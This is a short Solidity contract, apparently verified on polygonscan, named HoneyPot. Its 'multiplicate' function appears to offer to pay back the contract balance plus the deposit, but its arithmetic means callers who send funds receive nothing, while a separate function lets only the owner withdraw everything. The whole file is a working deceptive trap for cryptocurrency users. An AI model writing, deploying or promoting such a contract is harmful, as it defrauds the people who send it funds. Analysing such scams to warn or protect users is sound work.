/**
 *Submitted for verification at polygonscan.com on 2022-11-17
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.4;

contract HoneyPot {
    address public owner = msg.sender;

    receive() external payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function multiplicate(address addr) public payable {
        if(msg.value >= address(this).balance) {
            payable(addr).transfer(address(this).balance + msg.value);
        }
    } 
}